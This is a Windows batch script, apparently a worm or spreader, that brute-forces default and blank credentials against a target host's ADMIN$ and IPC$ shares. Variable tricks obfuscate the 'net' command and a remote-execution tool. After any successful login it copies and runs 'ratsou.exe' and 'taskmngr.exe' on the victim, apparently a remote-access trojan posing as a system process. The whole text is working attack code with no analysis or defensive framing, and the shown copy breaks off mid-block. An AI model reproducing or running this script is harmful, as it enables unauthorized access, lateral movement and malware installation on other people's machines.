@echo off
:begin
set A=n
set B=e
set C=t
set P=b
set Q=o
%A%%B%%C% use \\%1\ADMIN$ "" /user:sa
if not errorlevel 1 goto sa2
%A%%B%%C% use \\%1\ADMIN$ "" /user:administrator
if not errorlevel 1 goto blkad2
%A%%B%%C% use \\%1\ADMIN$ "" /user:amministratore
if not errorlevel 1 goto amministratore2
%A%%B%%C% use \\%1\ADMIN$ "" /user:forsterkning
if not errorlevel 1 goto forsterkning2
%A%%B%%C% use \\%1\ADMIN$ "" /user:Verwalter
if not errorlevel 1 goto Verwalter2
%A%%B%%C% use \\%1\ADMIN$ "" /user:user
if not errorlevel 1 goto userblank2
%A%%B%%C% use \\%1\ADMIN$ "" /user:administrador
if not errorlevel 1 goto spanishadmin2
%A%%B%%C% use \\%1\ADMIN$ "administrador" /user:administrador
if not errorlevel 1 goto spanishadmin22
%A%%B%%C% use \\%1\ADMIN$ "default" /user:default
if not errorlevel 1 goto defdef2
%A%%B%%C% use \\%1\ADMIN$ "default" /user:user
if not errorlevel 1 goto defpass2
%A%%B%%C% use \\%1\ADMIN$ "user" /user:default
if not errorlevel 1 goto userdef2
%A%%B%%C% use \\%1\ADMIN$ "user" /user:user
if not errorlevel 1 goto useruser2
%A%%B%%C% use \\%1\ADMIN$ "12345" /user:administrator
if not errorlevel 1 goto administrator123452
%A%%B%%C% use \\%1\ADMIN$ "password" /user:administrator
if not errorlevel 1 goto administratorpassword2
%A%%B%%C% use \\%1\ADMIN$ "1234" /user:administrator
if not errorlevel 1 goto administrator12342
%A%%B%%C% use \\%1\ADMIN$ "123" /user:administrator
if not errorlevel 1 goto administrator1232
%A%%B%%C% use \\%1\ADMIN$ "123456" /user:administrator
if not errorlevel 1 goto administrator1234562
%A%%B%%C% use \\%1\ADMIN$ "administrator" /user:admin
if not errorlevel 1 goto adminadministrator2
%A%%B%%C% use \\%1\ADMIN$ "" /user:admin
if not errorlevel 1 goto adminblank2
%A%%B%%C% use \\%1\ADMIN$ "guest" /user:guest
if not errorlevel 1 goto guestguest2
%A%%B%%C% use \\%1\ADMIN$ "" /user:Administrateur
if not errorlevel 1 goto Administrateur2
%A%%B%%C% use \\%1\ADMIN$ "12345" /user:Administrateur
if not errorlevel 1 goto Administrateurpenis
%A%%B%%C% use \\%1\ADMIN$ "123456" /user:Administrateur
if not errorlevel 1 goto Administrateurpenis2
%A%%B%%C% use \\%1\ADMIN$ "Administrateur" /user:Administrateur
if not errorlevel 1 goto Administrateurx22
%A%%B%%C% use \\%1\ADMIN$ "student" /user:student
if not errorlevel 1 goto student2
%A%%B%%C% use \\%1\ADMIN$ "" /user:Invité
if not errorlevel 1 goto Invité2
%A%%B%%C% use \\%1\ADMIN$ "" /user:uzivatel
if not errorlevel 1 goto uzivatel2
%A%%B%%C% use \\%1\ADMIN$ "administrator" /user:administrator
if not errorlevel 1 goto adad2
%A%%B%%C% use \\%1\ADMIN$ "test" /user:administrator
if not errorlevel 1 goto adtest2
%A%%B%%C% use \\%1\ADMIN$ "test" /user:test
if not errorlevel 1 goto testt2
%A%%B%%C% use \\%1\ADMIN$ "test123" /user:administrator
if not errorlevel 1 goto adtestt2
%A%%B%%C% use \\%1\ADMIN$ "temp" /user:administrator
if not errorlevel 1 goto adtemp2
%A%%B%%C% use \\%1\ADMIN$ "temp123" /user:administrator
if not errorlevel 1 goto adtempp2
%A%%B%%C% use \\%1\ADMIN$ "pass" /user:administrator
if not errorlevel 1 goto adpass2
%A%%B%%C% use \\%1\ADMIN$ "password" /user:administrator
if not errorlevel 1 goto adpassw2
%A%%B%%C% use \\%1\ADMIN$ "admin" /user:administrator
if not errorlevel 1 goto adadmin2
%A%%B%%C% use \\%1\ADMIN$ "root" /user:root
if not errorlevel 1 goto rootroot2
%A%%B%%C% use \\%1\ADMIN$ "changeme" /user:administrator
if not errorlevel 1 goto adminch2
%A%%B%%C% use \\%1\ADMIN$ "admin" /user:admin
if not errorlevel 1 goto adminad2
%A%%B%%C% use \\%1\ADMIN$ "' /user:MERUSER
if not errorlevel 1 goto meruser2
%A%%B%%C% use \\%1\ADMIN$ "' /user:Extension
if not errorlevel 1 goto Extension
%A%%B%%C% use \\%1\IPC$ "" /user:sa
if not errorlevel 1 goto sa
%A%%B%%C% use \\%1\IPC$ "" /user:administrator
if not errorlevel 1 goto blkad
%A%%B%%C% use \\%1\IPC$ "" /user:amministratore
if not errorlevel 1 goto amministratore
%A%%B%%C% use \\%1\IPC$ "" /user:forsterkning
if not errorlevel 1 goto forsterkning
%A%%B%%C% use \\%1\IPC$ "" /user:Verwalter
if not errorlevel 1 goto Verwalter
%A%%B%%C% use \\%1\IPC$ "" /user:user
if not errorlevel 1 goto userblank
%A%%B%%C% use \\%1\IPC$ "" /user:administrador
if not errorlevel 1 goto spanishadmin
%A%%B%%C% use \\%1\IPC$ "administrador" /user:administrador
if not errorlevel 1 goto spanishadmin2
%A%%B%%C% use \\%1\IPC$ "default" /user:default
if not errorlevel 1 goto defdef
%A%%B%%C% use \\%1\IPC$ "default" /user:user
if not errorlevel 1 goto defpass
%A%%B%%C% use \\%1\IPC$ "user" /user:default
if not errorlevel 1 goto userdef
%A%%B%%C% use \\%1\IPC$ "user" /user:user
if not errorlevel 1 goto useruser
%A%%B%%C% use \\%1\IPC$ "12345" /user:administrator
if not errorlevel 1 goto administrator12345
%A%%B%%C% use \\%1\IPC$ "password" /user:administrator
if not errorlevel 1 goto administratorpassword
%A%%B%%C% use \\%1\IPC$ "1234" /user:administrator
if not errorlevel 1 goto administrator1234
%A%%B%%C% use \\%1\IPC$ "123" /user:administrator
if not errorlevel 1 goto administrator123
%A%%B%%C% use \\%1\IPC$ "123456" /user:administrator
if not errorlevel 1 goto administrator123456
%A%%B%%C% use \\%1\IPC$ "administrator" /user:admin
if not errorlevel 1 goto adminadministrator
%A%%B%%C% use \\%1\IPC$ "" /user:admin
if not errorlevel 1 goto adminblank
%A%%B%%C% use \\%1\IPC$ "guest" /user:guest
if not errorlevel 1 goto guestguest
%A%%B%%C% use \\%1\IPC$ "" /user:Administrateur
if not errorlevel 1 goto Administrateur
%A%%B%%C% use \\%1\IPC$ "Administrateur" /user:Administrateur
if not errorlevel 1 goto Administrateurx2
%A%%B%%C% use \\%1\IPC$ "student" /user:student
if not errorlevel 1 goto student
%A%%B%%C% use \\%1\IPC$ "" /user:Invité
if not errorlevel 1 goto Invité
%A%%B%%C% use \\%1\IPC$ "" /user:uzivatel
if not errorlevel 1 goto uzivatel
%A%%B%%C% use \\%1\IPC$ "administrator" /user:administrator
if not errorlevel 1 goto adad
%A%%B%%C% use \\%1\IPC$ "test" /user:administrator
if not errorlevel 1 goto adtest
%A%%B%%C% use \\%1\IPC$ "test" /user:test
if not errorlevel 1 goto testt
%A%%B%%C% use \\%1\IPC$ "test123" /user:administrator
if not errorlevel 1 goto adtestt
%A%%B%%C% use \\%1\IPC$ "temp" /user:administrator
if not errorlevel 1 goto adtemp
%A%%B%%C% use \\%1\IPC$ "temp123" /user:administrator
if not errorlevel 1 goto adtempp
%A%%B%%C% use \\%1\IPC$ "pass" /user:administrator
if not errorlevel 1 goto adpass
%A%%B%%C% use \\%1\IPC$ "password" /user:administrator
if not errorlevel 1 goto adpassw
%A%%B%%C% use \\%1\IPC$ "admin" /user:administrator
if not errorlevel 1 goto adadmin
%A%%B%%C% use \\%1\IPC$ "root" /user:root
if not errorlevel 1 goto rootroot
%A%%B%%C% use \\%1\IPC$ "changeme" /user:administrator
if not errorlevel 1 goto adminch
%A%%B%%C% use \\%1\IPC$ "admin" /user:admin
if not errorlevel 1 goto adminad
%A%%B%%C% use \\%1\IPC$ "' /user:MERUSER
if not errorlevel 1 goto meruser
%A%%B%%C% use \\%1\IPC$ "' /user:Extension
if not errorlevel 1 goto Extension
goto end
:Extension
%P%%Q%%Q%%C% \\%1 -u Extension -p "" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u Extension -p "" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u Extension -p "" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u Extension -p "" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u Extension -p "" -d taskmngr.exe
goto end
:Administrateurpenis
%P%%Q%%Q%%C% \\%1 -u Administrateur -p "12345" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u Administrateur -p "12345" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u Administrateur -p "12345" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u Administrateur -p "12345" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u Administrateur -p "12345" -d taskmngr.exe
goto end
:Administrateurpenis2
%P%%Q%%Q%%C% \\%1 -u Administrateur -p "123456" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u Administrateur -p "123456" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u Administrateur -p "123456" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u Administrateur -p "123456" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u Administrateur -p "123456" -d taskmngr.exe
goto end
:meruser
%P%%Q%%Q%%C% \\%1 -u MERUSER -p "" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u MERUSER -p "" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u MERUSER -p "" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u MERUSER -p "" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u MERUSER -p "" -d taskmngr.exe
goto end
:userblank
%P%%Q%%Q%%C% \\%1 -u user -p "" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u user -p "" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u user -p "" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u user -p "" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u user -p "" -d taskmngr.exe
goto end
:defdef
%P%%Q%%Q%%C% \\%1 -u default -p "default" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u default -p "default" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u default -p "default" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u default -p "default" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u default -p "default" -d taskmngr.exe
goto end
:defpass
%P%%Q%%Q%%C% \\%1 -u user -p "default" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u user -p "default" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u user -p "default" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u user -p "default" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u user -p "default" -d taskmngr.exe
goto end
:userdef
%P%%Q%%Q%%C% \\%1 -u default -p "user" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u default -p "user" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u default -p "user" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u default -p "user" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u default -p "user" -d taskmngr.exe
goto end
:useruser
%P%%Q%%Q%%C% \\%1 -u user -p "user" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u user -p "user" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u user -p "user" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u user -p "user" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u user -p "user" -d taskmngr.exe
goto end
:administrator12345
%P%%Q%%Q%%C% \\%1 -u administrator -p "12345" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "12345" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "12345" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "12345" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "12345" -d taskmngr.exe
goto end
:administratorpassword
%P%%Q%%Q%%C% \\%1 -u administrator -p "password" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "password" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "password" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "password" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "password" -d taskmngr.exe
goto end
:administrator1234
%P%%Q%%Q%%C% \\%1 -u administrator -p "1234" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "1234" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "1234" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "1234" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "1234" -d taskmngr.exe
goto end
:administrator123
%P%%Q%%Q%%C% \\%1 -u administrator -p "123" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "123" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "123" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "123" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "123" -d taskmngr.exe
goto end
:administrator123456
%P%%Q%%Q%%C% \\%1 -u administrator -p "123456" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "123456" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "123456" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "123456" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "123456" 
goto end
:adminadministrator
%P%%Q%%Q%%C% \\%1 -u admin -p "administrator" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u admin -p "administrator" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u admin -p "administrator" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u admin -p "administrator" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u admin -p "administrator" -d taskmngr.exe
goto end
:adminblank
%P%%Q%%Q%%C% \\%1 -u admin -p "" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u admin -p "" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u admin -p "" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u admin -p "" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u admin -p "" -d taskmngr.exe
goto end
:sa
%P%%Q%%Q%%C% \\%1 -u sa -p "" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u sa -p "" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u sa -p "" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u sa -p "" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u sa -p "" -d taskmngr.exe
goto end
:guestguest
%P%%Q%%Q%%C% \\%1 -u guest -p "guest" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u guest -p "guest" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u guest -p "guest" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u guest -p "guest" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u guest -p "guest" -d taskmngr.exe
goto end
:Administrateur
%P%%Q%%Q%%C% \\%1 -u Administrateur -p "" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u Administrateur -p "" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u Administrateur -p "" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u Administrateur -p "" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u Administrateur -p "" -d taskmngr.exe
goto end
:Administrateurx2
%P%%Q%%Q%%C% \\%1 -u Administrateur -p "Administrateur" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u Administrateur -p "Administrateur" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u Administrateur -p "Administrateur" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u Administrateur -p "Administrateur" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u Administrateur -p "Administrateur" -d taskmngr.exe
goto end
:student
%P%%Q%%Q%%C% \\%1 -u student -p "student" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u student -p "student" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u student -p "student" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u student -p "student" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u student -p "student" -d taskmngr.exe
goto end
:Invité
%P%%Q%%Q%%C% \\%1 -u Invité -p "" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u Invité -p "" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u Invité -p "" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u Invité -p "" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u Invité -p "" -d taskmngr.exe
goto end
:amministratore
%P%%Q%%Q%%C% \\%1 -u amministratore -p "" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u amministratore -p "" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u amministratore -p "" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u amministratore -p "" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u amministratore -p "" -d taskmngr.exe
goto end
:uzivatel
%P%%Q%%Q%%C% \\%1 -u uzivatel -p "" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u uzivatel -p "" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u uzivatel -p "" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u uzivatel -p "" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u uzivatel -p "" -d taskmngr.exe
goto end
:blkad
%P%%Q%%Q%%C% \\%1 -u administrator -p "" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "" -d taskmngr.exe
goto end
:adad
%P%%Q%%Q%%C% \\%1 -u administrator -p "admin" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "admin" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "admin" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "admin" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "admin" -d taskmngr.exe
goto end
:adadmin
%P%%Q%%Q%%C% \\%1 -u administrator -p "administrator" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "administrator" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "administrator" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "administrator" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "administrator" -d taskmngr.exe
goto end
:rootroot
%P%%Q%%Q%%C% \\%1 -u root -p "root" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u root -p "root" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u root -p "root" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u root -p "root" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u root -p "root" -d taskmngr.exe
goto end
:adminad
%P%%Q%%Q%%C% \\%1 -u admin -p "admin" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u admin -p "admin" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u admin -p "admin" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u admin -p "admin" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u admin -p "admin" -d taskmngr.exe
goto end
:adtest
%P%%Q%%Q%%C% \\%1 -u administrator -p "test" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "test" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "test" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "test" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "test" -d taskmngr.exe
goto end
:forsterkning
%P%%Q%%Q%%C% \\%1 -u forsterkning -p "" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u forsterkning -p "" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u forsterkning -p "" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u forsterkning -p "" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u forsterkning -p "" -d taskmngr.exe
goto end
:testt
%P%%Q%%Q%%C% \\%1 -u test -p "test" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u test -p "test" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u test -p "test" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u test -p "test" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u test -p "test" -d taskmngr.exe
goto end
:adtestt
%P%%Q%%Q%%C% \\%1 -u administrator -p "test123" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "test123" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "test123" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "test123" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "test123" -d taskmngr.exe
goto end
:adtemp
%P%%Q%%Q%%C% \\%1 -u administrator -p "temp" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "temp" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "temp" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "temp" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "temp" -d taskmngr.exe
goto end
:adtempp
%P%%Q%%Q%%C% \\%1 -u administrator -p "temp123" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "temp123" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "temp123" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "temp123" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "temp123" -d taskmngr.exe
goto end
:adpass
%P%%Q%%Q%%C% \\%1 -u administrator -p "pass" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "pass" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "pass" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "pass" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "pass" -d taskmngr.exe
goto end
:adpassw
%P%%Q%%Q%%C% \\%1 -u administrator -p "password" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "password" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "password" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "password" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "password" -d taskmngr.exe
goto end
:adminch
%P%%Q%%Q%%C% \\%1 -u administrator -p "changeme" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "changeme" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "changeme" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "changeme" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "changeme" -d taskmngr.exe
goto end
:Verwalter
%P%%Q%%Q%%C% \\%1 -u Verwalter -p "" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u Verwalter -p "" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u Verwalter -p "" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u Verwalter -p "" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u Verwalter -p "" -d taskmngr.exe
goto end
:spanishadmin
%P%%Q%%Q%%C% \\%1 -u administrador -p "" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u administrador -p "" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrador -p "" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u administrador -p "" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrador -p "" -d taskmngr.exe
goto end
:spanishadmin2
%P%%Q%%Q%%C% \\%1 -u administrador -p "administrador" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u administrador -p "administrador" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrador -p "administrador" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u administrador -p "administrador" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrador -p "administrador" -d taskmngr.exe
:Extension2
%P%%Q%%Q%%C% \\%1 -u Extension -p "" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u Extension -p "" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u Extension -p "" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u Extension -p "" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u Extension -p "" -d taskmngr.exe
goto end
:meruser2
%P%%Q%%Q%%C% \\%1 -u MERUSER -p "" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u MERUSER -p "" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u MERUSER -p "" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u MERUSER -p "" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u MERUSER -p "" -d taskmngr.exe
goto end
:userblank2
%P%%Q%%Q%%C% \\%1 -u user -p "" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u user -p "" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u user -p "" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u user -p "" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u user -p "" -d taskmngr.exe
goto end
:defdef2
%P%%Q%%Q%%C% \\%1 -u default -p "default" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u default -p "default" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u default -p "default" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u default -p "default" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u default -p "default" -d taskmngr.exe
goto end
:defpass2
%P%%Q%%Q%%C% \\%1 -u user -p "default" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u user -p "default" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u user -p "default" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u user -p "default" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u user -p "default" -d taskmngr.exe
goto end
:userdef2
%P%%Q%%Q%%C% \\%1 -u default -p "user" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u default -p "user" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u default -p "user" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u default -p "user" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u default -p "user" -d taskmngr.exe
goto end
:useruser2
%P%%Q%%Q%%C% \\%1 -u user -p "user" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u user -p "user" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u user -p "user" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u user -p "user" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u user -p "user" -d taskmngr.exe
goto end
:administrator123452
%P%%Q%%Q%%C% \\%1 -u administrator -p "12345" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "12345" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "12345" -d taskmngr.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "12345" -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "12345" -d taskmngr.exe
goto end
:administratorpassword2
%P%%Q%%Q%%C% \\%1 -u administrator -p "password" -d attrib.exe -r ratsou.exe
%P%%Q%%Q%%C% \\%1 -u administrator -p "password" -f -c -d ratsou.exe -o
%P%%Q%%Q%%C% \\%1 -u administrator -p "password" -d taskmngr.exe
